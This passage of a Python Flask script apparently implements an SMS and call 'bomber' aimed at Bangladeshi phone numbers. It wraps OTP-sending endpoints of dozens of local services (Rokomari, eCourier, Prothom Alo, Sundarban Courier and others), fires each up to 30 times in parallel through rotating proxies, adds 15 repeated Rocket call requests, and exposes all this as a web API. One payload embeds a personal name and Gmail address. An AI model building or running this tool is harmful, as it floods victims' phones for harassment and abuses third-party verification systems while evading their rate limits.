    return send("https://cokestudio23.sslwireless.com/api/store-and-send-otp",
        {"msisdn":"880"+p.lstrip("0"),"name":"Aulad Hosen","email":"uladhosenridoy@gmail.com","dob":"2000-01-01","occupation":"N/A","gender":"male"},
        {"Content-Type":"application/json","Origin":"https://cokestudio23.sslwireless.com","User-Agent":"Mozilla/5.0"})

def api_cokestudio2(p):
    return send("https://cokestudio23.sslwireless.com/api/check-gp-number",{"msisdn":p},{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})

def api_rabbithole(p):
    return send("https://apix.rabbitholebd.com/appv2/login/requestOTP",{"mobile":"+880"+p.lstrip("0")},
        {"Content-Type":"application/json","Origin":"https://www.rabbitholebd.com","Referer":"https://www.rabbitholebd.com/","User-Agent":"Mozilla/5.0"})

def api_fundesh(p):
    return send("https://fundesh.com.bd/api/auth/generateOTP?service_key=",{"msisdn":p.lstrip("0")},
        {"Content-Type":"application/json","Origin":"https://fundesh.com.bd","Referer":"https://fundesh.com.bd/","User-Agent":"Mozilla/5.0"})

def api_swapbd(p):
    return send("https://api.swap.com.bd/api/v1/send-otp",{"phone":p},
        {"Content-Type":"application/json","Origin":"https://swap.com.bd","Referer":"https://swap.com.bd/","User-Agent":"Mozilla/5.0"})

def api_rokomari(p):
    return send(f"https://www.rokomari.com/otp/send?emailOrPhone=880{p.lstrip('0')}&countryCode=BD",method="GET",
        headers={"Accept":"application/json","Referer":"https://www.rokomari.com/","User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest"})

def api_ecourier(p):
    return send(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={p}",method="GET",
        headers={"Accept":"application/json","Origin":"https://ecourier.com.bd","Referer":"https://ecourier.com.bd/","User-Agent":"Mozilla/5.0"})

def api_paragon(p):
    return send("https://api.paragonfood.com.bd/auth/customerlogin",{"emailOrPhone":p},
        {"Content-Type":"application/json","Origin":"https://paragonfood.com.bd","Referer":"https://paragonfood.com.bd/","User-Agent":"Mozilla/5.0"})

def api_viewlift(p):
    return send("https://prod-api.viewlift.com/identity/signup?site=prothomalo",
        {"requestType":"send","phoneNumber":"+880"+p.lstrip("0"),"emailConsent":True,"whatsappConsent":False},
        {"Content-Type":"application/json","Origin":"https://www.prothomalo.com","Referer":"https://www.prothomalo.com/","User-Agent":"Mozilla/5.0"})

def api_viewlift2(p):
    return send("https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        {"requestType":"send","phoneNumber":"+880"+p.lstrip("0"),"emailConsent":True,"whatsappConsent":True},
        {"Content-Type":"application/json","Origin":"https://www.hoichoitv.com","Referer":"https://www.hoichoitv.com/","User-Agent":"Mozilla/5.0"})

def api_paperfly(p):
    return send("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        {"full_name":"Hjbdnd","company_name":"Hello","email_address":f"{rnd(10)}@gmail.com","phone_number":p},
        {"Content-Type":"application/json","Origin":"https://go-app.paperfly.com.bd","Referer":"https://go-app.paperfly.com.bd/","User-Agent":"Mozilla/5.0"})

def api_sundarbanpin(p):
    return send("https://tracking.sundarbancourierltd.com/PreBooking/SendPin",
        {"PreBookingRegistrationPhoneNumber":p,"PreBookingRegistrationUsername":p},
        {"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tracking.sundarbancourierltd.com","Referer":"https://tracking.sundarbancourierltd.com/","User-Agent":"Mozilla/5.0"},form=True)

# ═══════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════
SMS_ROUTES = {
    "robi":api_robi,"robi2":api_robi2,"gp":api_gp,"gp2":api_gp2,"gpay":api_gpay,
    "gpweblogin":api_gpweblogin,"banglalink":api_banglalink,
    "airtel":api_airtel,"airtel2":api_airtel2,
    "shikho":api_shikho,"ghoori":api_ghoori,"quizgiri":api_quizgiri,
    "quiztime":api_quiztime,"chorcha":api_chorcha,"medha":api_medha,"iqra":api_iqra,
    "chokrojan":api_chokrojan,"shomvob":api_shomvob,"wafilife":api_wafilife,
    "sindabad":api_sindabad,"bdstall":api_bdstall,"khaasfood":api_khaasfood,
    "walton":api_walton,"sundora":api_sundora,"bioscope":api_bioscope,
    "deeptoplay":api_deeptoplay,"cinematic":api_cinematic,"bdtickets":api_bdtickets,
    "bikroy":api_bikroy,"redx":api_redx,"redx2":api_redx2,"rflbestbuy":api_rflbestbuy,
    "circle":api_circle,"bcsexamaid":api_bcsexamaid,"sheba":api_sheba,"apex4u":api_apex4u,
    "kireibd":api_kireibd,"arogga":api_arogga,"arogga2":api_arogga2,
    "osudpotro":api_osudpotro,"hishabexpress":api_hishabexpress,
    "kabbik":api_kabbik,"applink":api_applink,"priyos":api_priyos,
    "salextra":api_salextra,"drl":api_drl,"sundarban":api_sundarban,
    "btcl":api_btcl,"pbs":api_pbs,"dressup":api_dressup,"garibook":api_garibook,
    "kfc":api_kfc,"foodaholic":api_foodaholic,"eatzy":api_eatzy,"eonbazar":api_eonbazar,
    "sw":api_sw,"proiojon":api_proiojon,"beautybooth":api_beautybooth,
    "binge":api_binge,"etestpaper":api_etestpaper,"chardike":api_chardike,"doctime":api_doctime,
    "cokestudio":api_cokestudio,"cokestudio2":api_cokestudio2,"rabbithole":api_rabbithole,
    "fundesh":api_fundesh,"swapbd":api_swapbd,"rokomari":api_rokomari,
    "ecourier":api_ecourier,"paragon":api_paragon,
    "viewlift":api_viewlift,"viewlift2":api_viewlift2,"paperfly":api_paperfly,"sundarbanpin":api_sundarbanpin,
}

CALL_ROUTES = {
    "rocket": api_rocket,
}

ALL_ROUTES = {**SMS_ROUTES, **CALL_ROUTES}

# ═══════════════════════════════════════════════════
#  ROUTES (Flask)
# ═══════════════════════════════════════════════════

@app.route("/", methods=["GET"])
def index():
    phn  = request.args.get("phone", "").strip()
    api  = request.args.get("api", "").strip().lower()
    typ  = request.args.get("type", "").strip().lower()
    lmt  = request.args.get("limit", "1").strip()

    if not phn: return jsonify(footer({"status":False,"error":"phone required"}))
    if not valid_bd(phn): return jsonify(footer({"status":False,"error":"Invalid BD number"}))
    if not api: return jsonify(footer({"status":False,"error":"api required",
                                       "modes":["sms","call","both"],
                                       "available":sorted(ALL_ROUTES.keys())}))
    try:
        limit = max(1, min(int(lmt), 30))
    except:
        limit = 1

    # ═══ SINGLE API ═══
    if api != "all" and api in ALL_ROUTES:
        is_call = api in CALL_ROUTES
        return _run_batch(phn, [api], limit, is_call=is_call)

    # ═══ ALL / TYPE-BASED ═══
    if api == "all":
        # type না দিলে auto: সব sms+calls
        if not typ: typ = "both"

        if typ == "sms":
            return _run_batch(phn, list(SMS_ROUTES.keys()), limit, is_call=False)
        elif typ == "call":
            return _run_batch(phn, ["rocket"], limit, is_call=True)
        elif typ == "both":
            return _run_both(phn, limit)
        else:
            return jsonify(footer({"status":False,"error":f"unknown type '{typ}'",
                                   "valid":["sms","call","both"]}))

    return jsonify(footer({"status":False,"error":f"unknown api '{api}'",
                           "available":sorted(ALL_ROUTES.keys())}))

def _run_batch(phn, names, limit, is_call=False):
    """প্রতিটা API কে `limit` বার parallel-এ call করবে (proxy rotate)"""
    jobs = []
    for name in names:
        fn = ALL_ROUTES[name]
        for i in range(limit):
            jobs.append((name, i+1, fn))

    results = {}
    def worker(name, run_no, fn):
        try:
            r = fn(phn)
            return (name, run_no, r)
        except Exception as e:
            return (name, run_no, {"error": str(e)[:120]})

    start = time.time()
    with ThreadPoolExecutor(max_workers=25) as pool:
        futs = [pool.submit(worker, n, r, f) for n, r, f in jobs]
        for f in as_completed(futs):
            name, run_no, res = f.result()
            results.setdefault(name, []).append({"run": run_no, "response": res})

    elapsed = round(time.time() - start, 2)
    return jsonify(footer({
        "status": True, "mode": "batch", "type": "call" if is_call else "sms",
        "phone": phn, "total_apis": len(names), "limit_per_api": limit,
        "total_calls": len(jobs), "elapsed_sec": elapsed,
        "results": results
    }))

def _run_both(phn, sms_limit):
    """SMS সব API × sms_limit  +  Rocket × 15  একসাথে"""
    sms_jobs = []
    for name, fn in SMS_ROUTES.items():
        for i in range(sms_limit):
            sms_jobs.append((name, i+1, fn))
    call_jobs = [("rocket", i+1, api_rocket) for i in range(15)]

    all_jobs = sms_jobs + call_jobs
    results  = {}

    def worker(name, run_no, fn):
        try:    return (name, run_no, fn(phn))
        except Exception as e: return (name, run_no, {"error": str(e)[:120]})

    start = time.time()
    with ThreadPoolExecutor(max_workers=30) as pool:
        futs = [pool.submit(worker, n, r, f) for n, r, f in all_jobs]
        for f in as_completed(futs):
            name, run_no, res = f.result()
            results.setdefault(name, []).append({"run": run_no, "response": res})

    elapsed = round(time.time() - start, 2)
    return jsonify(footer({
        "status": True, "mode": "both", "phone": phn,
        "sms_apis": len(SMS_ROUTES), "sms_limit": sms_limit,
        "call_api": "rocket", "call_limit": 15,
        "total_calls": len(all_jobs), "elapsed_sec": elapsed,
        "results": results
    }))

@app.route("/health", methods=["GET"])
def health():
    return jsonify(footer({"status":True,"message":"alive",
                           "sms_apis":len(SMS_ROUTES),"call_apis":len(CALL_ROUTES),
                           "total_apis":len(ALL_ROUTES),"proxies":len(PROXIES)}))

@app.route("/apis", methods=["GET"])
def apis():
    return jsonify(footer({"status":True,
                           "sms":sorted(SMS_ROUTES.keys()),
                           "call":sorted(CALL_ROUTES.keys()),
                           "total":len(ALL_ROUTES)}))

@app.route("/proxy/status", methods=["GET"])
def proxy_status():
    results=[]
    def test(px):
        try:
            r=requests.get("https://api.ipify.org?format=json",proxies={"http":px,"https":px},timeout=8,verify=False)
            return {"proxy":px[:25]+"...","ip":r.json().get("ip"),"alive":True}
        except Exception as e:
            return {"proxy":px[:25]+"...","error":str(e)[:60],"alive":False}
    with ThreadPoolExecutor(max_workers=10) as pool:
        results=list(pool.map(test,PROXIES))
    alive=sum(1 for r in results if r["alive"])
    return jsonify(footer({"status":True,"total":len(PROXIES),"alive":alive,"dead":len(PROXIES)-alive,"results":results}))

if __name__ == "__main__":
    port=int(os.environ.get("PORT",5000))
    app.run(host="0.0.0.0",port=port)



